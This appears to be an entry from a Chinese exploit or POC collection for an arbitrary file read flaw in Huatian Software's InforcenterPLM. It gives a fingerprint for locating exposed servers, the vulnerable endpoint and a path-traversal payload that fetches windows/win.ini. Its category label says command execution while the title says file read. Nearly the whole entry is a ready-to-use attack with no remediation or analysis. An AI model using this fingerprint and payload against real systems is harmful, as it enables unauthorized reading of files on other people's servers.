# 华天软件InforcenterPLM存在任意文件读取漏洞

华天软件 ｜ 命令执行 ｜ —
- **指纹**：`body="/Base/BaseHandler.ashx"`
- **请求**：`POST /Base/BaseHandler.ashx HTTP/1.1`

**Payload**
```
type=downloadFile&extensionName=config&fileName=../../windows/win.ini
```
- **响应特征**：200